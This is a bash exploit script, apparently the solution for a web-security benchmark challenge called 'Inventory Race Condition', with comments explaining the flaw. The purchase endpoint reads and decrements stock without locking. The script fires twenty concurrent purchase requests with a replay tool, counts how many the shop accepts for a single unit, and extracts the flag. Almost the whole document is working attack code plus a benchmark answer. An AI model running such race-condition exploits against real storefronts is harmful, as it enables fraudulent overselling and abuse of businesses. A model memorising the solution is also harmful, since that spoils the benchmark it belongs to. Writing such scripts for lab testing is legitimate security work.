#!/usr/bin/env bash
# APEX-035-25 — "Inventory Race Condition" (tags: race_condition, toctou)
#
# `/api/purchase` reads the inventory, decides, and decrements, and nothing
# holds the row in between. One unit of the limited edition therefore sells as
# many times as there are requests inside that window.
#
# A note on what is being proved. The application prints the flag to whoever
# buys the trophy, and there is one in stock, so a single honest purchase also
# prints it — the flag alone does not distinguish an exploit from a purchase.
# What distinguishes them is the count: this sends twenty together with
# `--repeat 20 --race` and reports how many of them the shop accepted. More
# than one is the defect.
#
# `X-User-Id` has to be a number. The endpoint falls back to `anon-<uuid>` when
# the header is absent, and the orders table stores the buyer as an integer, so
# an anonymous purchase decrements the stock and then fails to record the order
# — a 500 after the damage, which reads like a benchmark that resists.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex035-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/api/products" --session "$SESSION" --new --capture >/dev/null

REPLY="$("$H5I" websec replay req_0 --session "$SESSION" --create --repeat 20 --race \
    --set method=POST --set path=/api/purchase \
    --set header.Content-Type=application/json \
    --set header.X-User-Id=1 \
    --set json.productId=golden-flag-trophy)"

printf '%s' "$REPLY" | python3 -c '
import json, sys
sold = [s for s in json.load(sys.stdin)["samples"]
        if 200 <= (s.get("status") or 0) < 300]
print(f"{len(sold)} of 20 purchases accepted for one unit of stock",
      file=sys.stderr)
print(sold[0]["seq"] if sold else "")
' 2>/dev/null | {
    read -r SEQ
    [ -n "$SEQ" ] || { echo "no purchase went through"; exit 1; }
    "$H5I" websec show "res_$SEQ" --session "$SESSION" --raw | flag
}
